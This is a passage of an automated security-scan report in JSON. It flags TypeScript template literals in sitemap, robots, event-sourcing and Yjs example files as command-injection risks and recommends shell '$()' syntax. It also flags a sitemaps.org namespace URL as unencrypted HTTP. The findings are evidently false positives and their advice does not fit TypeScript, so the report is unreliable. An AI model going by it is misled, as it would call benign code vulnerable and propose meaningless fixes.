      "issue": "Backtick command execution",
      "evidence": "const response = await fetch(`/api/posts/${id}`, { method: 'DELETE' });",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/nextjs-seo/resources/examples/typescript/robots.ts",
      "line_number": 78,
      "issue": "Backtick command execution",
      "evidence": "sitemap: `${baseUrl}/sitemap.xml`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/nextjs-seo/resources/examples/typescript/robots.ts",
      "line_number": 359,
      "issue": "Backtick command execution",
      "evidence": "sitemap: `https://${domain}/sitemap.xml`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/nextjs-seo/resources/examples/typescript/robots.ts",
      "line_number": 360,
      "issue": "Backtick command execution",
      "evidence": "host: `https://${domain}`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
      "line_number": 78,
      "issue": "Backtick command execution",
      "evidence": "url: `${baseUrl}/blog/${post.slug}`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
      "line_number": 86,
      "issue": "Backtick command execution",
      "evidence": "url: `${baseUrl}/products/${product.id}`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
      "line_number": 101,
      "issue": "Backtick command execution",
      "evidence": "url: `${baseUrl}/about`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
      "line_number": 107,
      "issue": "Backtick command execution",
      "evidence": "url: `${baseUrl}/contact`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
      "line_number": 132,
      "issue": "Backtick command execution",
      "evidence": "url: `${baseUrl}/about`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
      "line_number": 153,
      "issue": "Backtick command execution",
      "evidence": "const path = page ? `/${lang}/${page}` : `/${lang}`",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
      "line_number": 156,
      "issue": "Backtick command execution",
      "evidence": "url: `${baseUrl}${path}`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
      "line_number": 159,
      "issue": "Backtick command execution",
      "evidence": "priority: path === `/${lang}` ? 1 : 0.8,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
      "line_number": 162,
      "issue": "Backtick command execution",
      "evidence": "languages.map(l => [l, `${baseUrl}/${l}${page ? `/${page}` : ''}`])",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
      "line_number": 208,
      "issue": "Backtick command execution",
      "evidence": "url: `${baseUrl}${path}`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
      "line_number": 238,
      "issue": "Backtick command execution",
      "evidence": "url: `${baseUrl}/blog/${post.slug}`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
      "line_number": 259,
      "issue": "Backtick command execution",
      "evidence": "url: `${baseUrl}/blog`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
      "line_number": 268,
      "issue": "Backtick command execution",
      "evidence": "url: `${baseUrl}/blog?page=${page}`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
      "line_number": 294,
      "issue": "Backtick command execution",
      "evidence": "url: `${baseUrl}/blog/${post.slug}`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
      "line_number": 313,
      "issue": "Backtick command execution",
      "evidence": "url: `${baseUrl}/sitemap-pages.xml`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
      "line_number": 317,
      "issue": "Backtick command execution",
      "evidence": "url: `${baseUrl}/sitemap-posts.xml`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
      "line_number": 321,
      "issue": "Backtick command execution",
      "evidence": "url: `${baseUrl}/sitemap-products.xml`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Network Security",
      "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
      "line_number": 335,
      "issue": "Unencrypted HTTP",
      "evidence": "<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">",
      "recommendation": "Use HTTPS for external resources"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
      "line_number": 401,
      "issue": "Backtick command execution",
      "evidence": "url: `${baseUrl}${entry.path}`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/nextjs-seo/resources/examples/typescript/sitemap.ts",
      "line_number": 455,
      "issue": "Backtick command execution",
      "evidence": "url: `${baseUrl}/blog/${post.slug}`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/frontend/nextjs-seo/resources/examples/typescript/structured-data.ts",
      "line_number": 506,
      "issue": "Backtick command execution",
      "evidence": "urlTemplate: `${searchUrl}?q={search_term_string}`,",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/event-sourcing/resources/examples/typescript/order_aggregate.ts",
      "line_number": 201,
      "issue": "Backtick command execution",
      "evidence": "throw new OrderError(`Product ${productId} not in order`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/event-sourcing/resources/examples/typescript/order_aggregate.ts",
      "line_number": 375,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Order ${order.getOrderId()} created for customer ${order.getCustomerId()}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/event-sourcing/resources/examples/typescript/order_aggregate.ts",
      "line_number": 380,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Added ${order.getItems().length} items`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/event-sourcing/resources/examples/typescript/order_aggregate.ts",
      "line_number": 381,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Total: $${order.getTotalAmount().toFixed(2)}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/event-sourcing/resources/examples/typescript/order_aggregate.ts",
      "line_number": 385,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Order submitted with status: ${order.getStatus()}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/event-sourcing/resources/examples/typescript/order_aggregate.ts",
      "line_number": 389,
      "issue": "Backtick command execution",
      "evidence": "console.log(`\\nUncommitted events: ${events.length}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/event-sourcing/resources/examples/typescript/order_aggregate.ts",
      "line_number": 391,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  ${i + 1}. ${event.eventType} (v${event.version})`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/event-sourcing/resources/examples/typescript/order_aggregate.ts",
      "line_number": 402,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Reconstructed order`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/event-sourcing/resources/examples/typescript/order_aggregate.ts",
      "line_number": 403,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Customer: ${reconstructed.getCustomerId()}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/event-sourcing/resources/examples/typescript/order_aggregate.ts",
      "line_number": 404,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Items: ${reconstructed.getItems().length}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/event-sourcing/resources/examples/typescript/order_aggregate.ts",
      "line_number": 405,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Total: $${reconstructed.getTotalAmount().toFixed(2)}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/event-sourcing/resources/examples/typescript/order_aggregate.ts",
      "line_number": 406,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Status: ${reconstructed.getStatus()}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/event-sourcing/resources/examples/typescript/order_aggregate.ts",
      "line_number": 407,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Version: ${reconstructed.getVersion()}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
      "line_number": 45,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Doc 1: \"${text1.toString()}\"`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
      "line_number": 46,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Doc 2: \"${text2.toString()}\"`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
      "line_number": 51,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Doc 1: \"${text1.toString()}\"`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
      "line_number": 52,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Doc 2: \"${text2.toString()}\"`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
      "line_number": 76,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Initial: \"${text1.toString()}\"`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
      "line_number": 84,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  Doc 1: \"${text1.toString()}\"`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
      "line_number": 89,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  Doc 2: \"${text2.toString()}\"`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
      "line_number": 96,
      "issue": "Backtick command execution",
      "evidence": "console.log(`\\nDoc 1: \"${text1.toString()}\"`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
      "line_number": 97,
      "issue": "Backtick command execution",
      "evidence": "console.log(`Doc 2: \"${text2.toString()}\"`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
      "line_number": 129,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  Doc 1: ${JSON.stringify(map1.toJSON())}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
      "line_number": 130,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  Doc 2: ${JSON.stringify(map2.toJSON())}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
      "line_number": 139,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  Doc 1: ${JSON.stringify(array1.toJSON())}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
      "line_number": 140,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  Doc 2: ${JSON.stringify(array2.toJSON())}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
      "line_number": 216,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  ${user}'s todos:`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
      "line_number": 221,
      "issue": "Backtick command execution",
      "evidence": "console.log(`    [${status}] ${text}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
      "line_number": 243,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  After insert: \"${text.toString()}\"`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
      "line_number": 246,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  After insert: \"${text.toString()}\"`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
      "line_number": 249,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  After insert: \"${text.toString()}\"`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
      "line_number": 254,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  After undo: \"${text.toString()}\"`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
      "line_number": 257,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  After undo: \"${text.toString()}\"`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
      "line_number": 262,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  After redo: \"${text.toString()}\"`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
      "line_number": 265,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  After redo: \"${text.toString()}\"`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
      "line_number": 287,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  Text: \"${text1.toString()}\"`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
      "line_number": 288,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  Metadata: ${JSON.stringify(map1.toJSON())}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
      "line_number": 292,
      "issue": "Backtick command execution",
      "evidence": "console.log(`\\nSerialized to ${state.length} bytes`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
      "line_number": 305,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  Text: \"${text2.toString()}\"`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
      "line_number": 306,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  Metadata: ${JSON.stringify(map2.toJSON())}`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
      "line_number": 328,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  Inserted: \"${change.insert}\"`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
      "line_number": 330,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  Deleted: ${change.delete} characters`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
      "line_number": 332,
      "issue": "Backtick command execution",
      "evidence": "console.log(`  Retained: ${change.retain} characters`);",
      "recommendation": "Use $() syntax and validate inputs"
    },
    {
      "severity": "MEDIUM",
      "category": "Command Injection Risk",
      "file": "skills/distributed-systems/crdt-fundamentals/resources/examples/typescript/yjs-collaborative-editing.ts",
      "line_number": 347,
      "issue": "Backtick command execution",
      "evidence": "console.log(`\\nFinal text: \"${text.toString()}\"`);",
      "recommendation": "Use $() syntax and validate inputs"
    }
  ]
}